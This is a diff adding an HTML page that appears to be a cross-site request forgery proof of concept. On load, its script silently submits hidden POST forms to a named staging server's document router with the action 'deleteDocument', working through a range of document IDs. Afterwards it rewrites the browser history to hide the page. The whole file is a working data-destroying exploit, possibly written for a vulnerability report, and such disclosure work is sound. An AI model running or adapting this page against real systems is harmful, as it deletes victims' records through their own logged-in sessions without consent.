@@ -1,0 +1,43 @@
+<html>
+  <body>
+    <script>
+      const startId = 253440;
+      const endId = 253448;
+      const delay = 500; // milliseconds between requests
+
+      let currentId = startId;
+
+      function submitNext() {
+        if (currentId > endId) {
+          history.pushState('', '', '/');
+          return;
+        }
+
+        const form = document.createElement("form");
+        form.method = "POST";
+        form.action = "https://stagingdev.pestroutes.com/resources/routers/documentRouter.php";
+
+        const inputAction = document.createElement("input");
+        inputAction.type = "hidden";
+        inputAction.name = "action";
+        inputAction.value = "deleteDocument";
+
+        const inputId = document.createElement("input");
+        inputId.type = "hidden";
+        inputId.name = "id";
+        inputId.value = currentId;
+
+        form.appendChild(inputAction);
+        form.appendChild(inputId);
+
+        document.body.appendChild(form);
+        form.submit();
+
+        currentId++;
+        setTimeout(submitNext, delay);
+      }
+
+      submitNext();
+    </script>
+  </body>
+</html>
